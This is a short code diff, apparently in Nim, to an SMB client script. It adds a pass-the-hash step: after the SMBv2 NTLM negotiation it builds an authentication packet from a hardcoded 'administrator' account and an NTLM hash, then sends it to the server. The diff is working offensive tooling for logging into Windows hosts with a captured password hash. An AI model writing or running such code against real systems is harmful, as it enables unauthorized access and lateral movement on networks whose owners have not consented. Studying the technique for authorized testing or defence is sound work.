@@ -62,5 +62,13 @@ recvClient = sock.recvPacket(1024, 100)
 ## SMBv2NTLM negotiate
 sock.send(getSMBv2NTLMNego(signing))
 response = sock.recvPacketForNTLM(1024, 100)
-echo getSMBv2NTLMSSP(response)
+echo response.len()
+## Pass the hash
+let 
+    user = "administrator"
+    hash = "47bf8039a8506cd67c524a03ff84ba4e"
+    domain = "."
+    authPacket = getSMBv2NTLMAuth(getSMBv2NTLMSSP(response, hash, domain, user, signing)) 
+sock.send(authPacket)
+recvClient = sock.recvPacket(1024, 100)
 sock.close()
